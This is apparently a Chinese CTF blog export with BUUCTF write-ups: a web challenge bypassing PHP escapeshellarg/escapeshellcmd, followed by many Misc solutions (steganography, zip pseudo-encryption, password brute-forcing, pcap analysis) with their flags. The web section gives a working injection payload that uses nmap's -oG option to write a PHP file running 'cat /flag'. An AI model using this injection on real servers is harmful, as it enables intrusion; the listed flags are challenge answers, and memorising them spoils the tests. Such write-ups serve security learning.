此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行操作符</a> 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。</p><h4 id="利用-绕过-PHP-escapeshellarg-escapeshellcmd函数："><a href="#利用-绕过-PHP-escapeshellarg-escapeshellcmd函数：" class="headerlink" title="利用/绕过 PHP escapeshellarg/escapeshellcmd函数："></a><a href="https://zhuanlan.zhihu.com/p/36602107" target="_blank" rel="noopener">利用/绕过 PHP escapeshellarg/escapeshellcmd函数：</a></h4><p>escapeshellarg和escapeshellcmd的功能<br>escapeshellarg<br>1.确保用户只传递一个参数给命令<br>2.用户不能指定更多的参数一个<br>3.用户不能执行不同的命令</p><p>escapeshellcmd<br>1.确保用户只执行一个命令<br>2.用户可以指定不限数量的参数<br>3.用户不能执行不同的命令</p><h4 id="chdir-函数："><a href="#chdir-函数：" class="headerlink" title="chdir()函数："></a>chdir()函数：</h4><p>新建一个目录</p><h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h3><p>首先请求头里面要有X_FORWARDED_FOR，有的话会被变成REMOTE_ADDR</p><p>get传入参数host，这里用该就是传入ip</p><p>看了看<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a>(一个很强的技术站点)</p><p>然后配合这篇文章才能完全理解哈：</p><p><a href="http://www.lmxspace.com/2018/07/16/谈谈escapeshellarg参数绕过和注入的问题/" target="_blank" rel="noopener">谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com)</a></p><p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p><p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了,或者直接查看flag</p><pre><code>?host=&#39; &lt;?echo `cat /flag`;?&gt; -oG hack.php &#39;</code></pre><p>执行后会返回文件夹名</p><h1 id="2021-04-29"><a href="#2021-04-29" class="headerlink" title="2021-04-29"></a>2021-04-29</h1><p>蓝帽杯</p><h1 id="2021-04-30"><a href="#2021-04-30" class="headerlink" title="2021-04-30"></a>2021-04-30</h1><p>转战ctfhub</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf之Misc</title>
      <link href="/2021/01/15/buuctf-zhi-misc/"/>
      <url>/2021/01/15/buuctf-zhi-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33035611&auto=1&height=66"></iframe><h1 id="2021-1-15"><a href="#2021-1-15" class="headerlink" title="2021/1/15"></a>2021/1/15</h1><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>下载得到QR_code.png图片，扫码得到secret is here，但并非flag。</p><p>但是这个图片的大小却是600多个kb，所以怀疑是压缩包文件，改个后缀zip打开发现有密码</p><p>因为文件名字是4number所以爆破得到密码7639，解压得到flag：CTF{vjpw_wnoei}</p><p>改为flag{vjpw_wnoei}提交成功</p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>也是一个改后缀的题，改为txt得到</p><pre><code>data:image/jpg;base64,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</code></pre><p>要是我记得没错应该是base64和图片的转换，得到二维码一张扫一下得：KEY{dca57f966e4e4e31fd5b15417da63269}</p><p>flag{dca57f966e4e4e31fd5b15417da63269}</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>提示：看不到图？ 是不是屏幕太小了 </p><p>意思就是说这个图下面还有一半没显示出来</p><p>用winhex打开</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8815%E6%97%A51825_1.png" alt></p><p>将67改为与23相同的02和A7（修改高度和宽度相同）然后得到flag{He1l0_d4_ba1}</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>tmd，又是一道图片隐写题</p><p>winhex打开看看，直接Ctrl+f就找到了</p><p>flag{stego_is_s0_bor1ing}</p><h1 id="2021-1-16"><a href="#2021-1-16" class="headerlink" title="2021/1/16"></a>2021/1/16</h1><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>提示：给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对= =我说了什么了不得的东西。。 </p><p>一看是四位数的密码，ARAR直接爆破</p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>这个题说来也巧，我刚在u盘里面发现一个没用的图片并且把它删了，结果下一题（这个题）就是我删掉的图片</p><p>winhex直接过</p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><h3 id="关于stegsolve的使用："><a href="#关于stegsolve的使用：" class="headerlink" title="关于stegsolve的使用："></a>关于stegsolve的使用：</h3><p>File Format:文件格式，这里可以看见图片的具体信息有时候有些图片隐写的flag会藏在这里</p><p>Data Extract:数据提取，用于提取RGB数据信息</p><p>Steregram Solve:立体试图 可以左右控制偏移</p><p>Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，把动图一帧帧的放</p><p>Image Combiner:拼图，图片拼接</p><h4 id="关于版块Data-Extract"><a href="#关于版块Data-Extract" class="headerlink" title="关于版块Data Extract"></a>关于版块Data Extract</h4><p>Data Extract:(好多涉及到数据提取的时候，很多博主在wp中都是一带而过，小白们还以为要一个个试。。)</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8817%E6%97%A51639_1.png" alt></p><p> 左边一大部分主要是讲了RGBA（Alpha是透明度）的颜色通道</p><p>为了方便理解我们分开说</p><p>RGB是红绿蓝 但他们的值代表的实际上是亮度</p><p>R的数字越大，则代表红色亮度越高；R的数字越小，则代表红色亮度越低。G，B同理</p><p>R的亮度各有256个级别，GB同理。即从0到255，合计为256个。从数字0到255的逐渐增高，我们人眼观察到的就是亮度越来越大，红色、绿色或蓝色越来越亮。然而256是2的8次方 所以你会看见上图的7~0 一共8个通道</p><p>而Alpha就是透明度 该通道用256级灰度来记录图像中的透明度信息，定义透明、不透明和半透明区域</p><p>alpha的值为0就是全透明，alpha 的值为 255 则表示不透明</p><p>因此左半部分就理解了</p><p>右半部分就是Extra By(额外的)和Bit Order（位顺序）和Bit Plane Order（位平面的顺序）</p><p>1）.Extra By(额外的)：分为row（行）和column（纵）</p><p>  每个像素用R，G，B三个分量表示，那么一张图片就像一个矩阵，矩阵的每个单位就是（0<del>255，0</del>255，0~255）</p><p>  也就会有是纵排列和行排列了，一般事先访问行再访问列（如果相反会引起ve使用方法）</p><p>￼2）.Bit Order（位顺序）:MSB是一串数据的最高位，LSB是一串数据的最低位。</p><p>3）.Bit Plane Order（位平面的顺序)</p><p>   整个图像分解为8个位平面，从LSB(最低有效位0)到MSB（最高有效位7）随着从位平面0 到位平面7，位平面图像的特征逐渐变得复杂，细节不断增加。（一般我们的图片如果是RGB那么就是24位 3乘8嘛）</p><p>4）Bit Plane Order（位平面的顺序）:一般图片是24位 也就是3个8 大家可以想像成三明治 比如BGR就是B为三明治第一层 G为第二层 R为第三层。</p><h3 id="关于此题：LSB"><a href="#关于此题：LSB" class="headerlink" title="关于此题：LSB"></a>关于此题：LSB</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8817%E6%97%A51645_2.png" alt></p><p>save bin格式为png后，会发现这是一样二维码，扫码得到cumtctf{1sb_i4_s0_Ea4y}</p><p>flag{1sb_i4_s0_Ea4y}</p><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>得到一个jpeg后缀的图片</p><p>原来flag藏在文件的属性里面啊</p><h1 id="2021-1-17"><a href="#2021-1-17" class="headerlink" title="2021/1/17"></a>2021/1/17</h1><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>提示：这个是一个rar文件，里面好像隐藏着什么秘密，但是压缩包被加密了，毫无保留的告诉你，rar的密码是4位纯数字。</p><p>爆破就ok</p><p>密码：8795</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>提示：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)</p><p>直接搜索password，找到对应的value就是flag</p><p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>得到一个二维码</p><p>扫码即可flag{878865ce73370a4ce607d21ca01b5e59}</p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>知识点补充：</p><h3 id="来了解一下ZIP文件的组成"><a href="#来了解一下ZIP文件的组成" class="headerlink" title="来了解一下ZIP文件的组成"></a><strong>来了解一下ZIP文件的组成</strong></h3><p>一个 ZIP 文件由三个部分组成：<br>　　压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><h4 id="a-压缩源文件数据区："><a href="#a-压缩源文件数据区：" class="headerlink" title="a.压缩源文件数据区："></a>a.压缩源文件数据区：</h4><p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密，奇数加密，偶数无加密）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500</p><h4 id="b-压缩源文件目录区"><a href="#b-压缩源文件目录区" class="headerlink" title="b.压缩源文件目录区:"></a>b.压缩源文件目录区:</h4><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密，奇数加密，偶数无加密）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</p><h4 id="c-压缩源文件目录结束标志"><a href="#c-压缩源文件目录结束标志" class="headerlink" title="c.压缩源文件目录结束标志:"></a>c.压缩源文件目录结束标志:</h4><p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 1A：ZIP 文件注释长度</p><p>在这个010工具里面他会自动识别并且给你，这里针对我的加粗字体的地方进行修改，基本就是位于14 00后面，保存再次打开就没加密了flag{Adm1N-B2G-kU-SZIP}</p><h1 id="2021-1-18"><a href="#2021-1-18" class="headerlink" title="2021/1/18"></a>2021/1/18</h1><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>foremost跑一下得到</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8820%E6%97%A50026_1.png" alt></p><p>根据题目所说的4位数，我们直接进行爆破得到密码8368的打开文件得到flag{b025fc9ca797a67d2103bfbc407a6d5f}</p><h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>得到图片名字叫steg</p><p>所以用stegsolve打开lsb隐写(在red plane 0处，左上角有无规则点)终结题目</p><p>flag{st3g0_ saurus_wr3cks}</p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>tip：某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？</p><p>直接wireshark查找flag，ctrl+d找到与之对应的分组详情，右键显示分组字节即可flag{da73d88936010da1eeeb36e945ec4b97}</p><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>提示：小明有一个保险箱，里面珍藏了小明的日记本，他记录了什么秘密呢？。。。告诉你，其实保险箱的密码四位纯数字密码。</p><p>得到的图片改为.zip后缀，直接爆破即可7869</p><p>flag{75a3d68bf071ee188c418ea6cf0bb043}</p><h1 id="2021-1-19"><a href="#2021-1-19" class="headerlink" title="2021/1/19"></a>2021/1/19</h1><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>得到文件jpg</p><p>winhex打开发现了里面说有flag.txt</p><p>那么用foremost分离肯定会得到东西</p><pre><code>-V  - 显示版权信息并退出-t  - 指定文件类型.  (-t jpeg,pdf ...) -d  -打开间接块检测 (针对UNIX文件系统) -i  - 指定输入文件 (默认为标准输入) -a  - 写入所有的文件头部, 不执行错误检测(损坏文件) -w  - 向磁盘写入审计文件，不写入任何检测到的文件-o  - 设置输出目录 (默认为为输出)-c  - 设置配置文件 (默认为 foremost.conf)-q  - 启用快速模式. 在512字节边界执行搜索.-Q  - 启用安静模式. 禁用输出消息. -v  - 详细模式. 向屏幕上记录所有消息。</code></pre><p>分离得到zip文件，有密码，在文件属性里面发现this_is_not_password其实这个就是密码，mad还摆我一道</p><p>flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>pcap文件用wireshark打开发现都是tcp文件，而且好像是从偶数开始，每个包都带有data的一点点小数据FLAG:385b87afc8671dee07550290d16a8071</p><p>flag{385b87afc8671dee07550290d16a8071}</p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>用winhex打开在最后发现了二进制编码01101011011011110110010101101011011010100011001101110011</p><p>分割：01101011 01101111 01100101 01101011 01101010 00110011 01110011</p><p>得到koekj3s就是flag</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>提示：请将 hctf 替换为 flag 提交，格式 flag{}</p><p>lsb隐写分离得到文件，改为zip格式，解压得到无后缀文件1，winhex打开得到：</p><p>hctf{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</p><p>flag{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</p><h1 id="2021-1-20"><a href="#2021-1-20" class="headerlink" title="2021/1/20"></a>2021/1/20</h1><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>得到一张路飞的图片</p><p>flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</p><p>flag{377cbadda1eca2f2f73d36277781f00a}</p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>得到一张图片，我怀疑上面是盲文解密</p><p>得到：kmdonowg</p><p>这个一定就是music压缩包的密码，结果打开以后一听，里面是莫斯电码的性质，用到工具audacity得到电码：</p><p>-.-. - ..-. .– .–. . .. —– —.. –… …– ..— ..–.. ..— …– -.. –..</p><p>解码：</p><p>CTFWPEI08732?23DZ</p><p>flag{wpei08732?23dz}</p><h2 id="BJDCTF-2nd-最简单的misc-y1ng"><a href="#BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="[BJDCTF 2nd]最简单的misc-y1ng"></a>[BJDCTF 2nd]最简单的misc-y1ng</h2><p>继续winhex打开<br>发现少了png的文件头。<br>于是添加上去（复制粘贴：塒NG)←89 50 4E 47</p><p>得到完整图片也就是424A447B79316E677A756973687561697D</p><p>BJD{y1ngzuishuai}</p><h2 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h2><p>得到图片使用<code>010 editor</code>打开的时候出现<code>CRC</code>匹配错误</p><p>总结：这种错误意思就是图片的高度被修改过</p><p>改前：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8822%E6%97%A51451_1.png" alt></p><p>改后：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8822%E6%97%A51451_2.png" alt></p><p>然后就会看到flag</p><p>BJD{PnG_He1ghT_1s_WR0ng}</p><p>flag{PnG_He1ghT_1s_WR0ng}</p><p>文件头格式：</p><p>JPEG (jpg)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：FFD8FF</p><p>PNG (png)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：89504E47</p><p>GIF (gif)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：47494638</p><p>ZIP Archive (zip)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：504B0304</p><p>RAR Archive (rar)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：52617221</p><h1 id="2021-1-21"><a href="#2021-1-21" class="headerlink" title="2021/1/21"></a>2021/1/21</h1><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>hint：神秘龙卷风转转转，科学家用四位数字为它命名，但是发现解密后居然是一串外星人代码！！好可怕！</p><p>四位数密码：5463</p><p>得到龙卷风：brainfuck解密</p><p>得flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><h2 id="BJDCTF-2nd-小姐姐-y1ng"><a href="#BJDCTF-2nd-小姐姐-y1ng" class="headerlink" title="[BJDCTF 2nd]小姐姐-y1ng"></a>[BJDCTF 2nd]小姐姐-y1ng</h2><p>WINHEX打开：</p><p>BJD{haokanma_xjj}</p><h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>hint：小白的网站被小黑攻击了，并且上传了Webshell，你能帮小白找到这个后门么？(Webshell中的密码(md5)即为答案)。</p><p>工具：D盾一扫就出来了</p><p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>得到文件：conf.bin</p><p>这是路由器配置文件。RouterPassView打开。</p><p>  找到：Username val=053700357621 </p><p>flag{053700357621}</p><h1 id="2021-1-22"><a href="#2021-1-22" class="headerlink" title="2021/1/22"></a>2021/1/22</h1><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>得到文件：stego100.wav</p><p>audacity打开，然后使劲放大得到电码</p><p>flag{5BC925649CB0188F52E617D70929191C}</p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>hint：公安机关近期截获到某网络犯罪团伙在线交流的数据包，但无法分析出具体的交流内容，聪明的你能帮公安机关找到线索吗？ </p><p>得到文件：流量中的线索.pcapng</p><p>wireshark抓包HTTP协议的200响应的得到base64编码</p><p><a href="https://the-x.cn/base64解码下载jpg格式图片" target="_blank" rel="noopener">https://the-x.cn/base64解码下载jpg格式图片</a></p><p>flag{209acebf6324a09671abc31c869de72c}</p><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>得到jpg图片，通过winhex发现有zip部分，后缀改为zip发现实伪加密，zip文件头为50 4B 01 02用010搜索一下，在14后面来改伪加密，得到一个jpg文件，用steghide解决问题：</p><pre><code>steghide info good.jpgsteghide extract -sf good.jpg</code></pre><p>关于这个用法，在windows上的用法简单，自己寻思吧，最后得到文件：ko.txt</p><p>利用里面的密码打开压缩包，就能得到flag</p><p>flag{1RTo8w@&amp;4nK@z*XL}</p><p>不错的一个题</p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>将得到图片后缀改为zip就能轻松打开</p><p>得到文件flag.vmdk，里面有个文件名字为nul在windows下面无法显示放到虚拟机试试</p><pre><code>7z x 